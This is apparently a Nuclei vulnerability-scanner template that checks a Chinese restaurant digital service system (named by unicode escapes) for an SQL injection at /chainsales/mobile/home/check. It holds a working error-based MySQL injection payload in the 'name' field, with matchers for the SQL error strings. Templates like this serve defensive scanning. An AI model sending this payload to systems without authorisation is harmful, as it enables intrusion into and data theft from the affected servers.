id: poc-yaml-can-xing-yun-home-check-sqli
info:
  name: \u55B0\u661F\u4E91-\u6570\u5B57\u5316\u9910\u996E\u670D\u52A1\u7CFB\u7EDF home_check SQL\u6CE8\u5165\u6F0F\u6D1E
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: \u55B0\u661F\u4E91-\u6570\u5B57\u5316\u9910\u996E\u670D\u52A1\u7CFB\u7EDF
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: POST
    path:
      - /chainsales/mobile/home/check
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,md5({{t1}})))),0x7e),8475) AND '1%'='1&pwd=123"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "SQLSTATE"
          - "General error:"
          - "GTID set specification"
          - "{{t2}}"
        part: body
      - type: status
        status:
          - 200
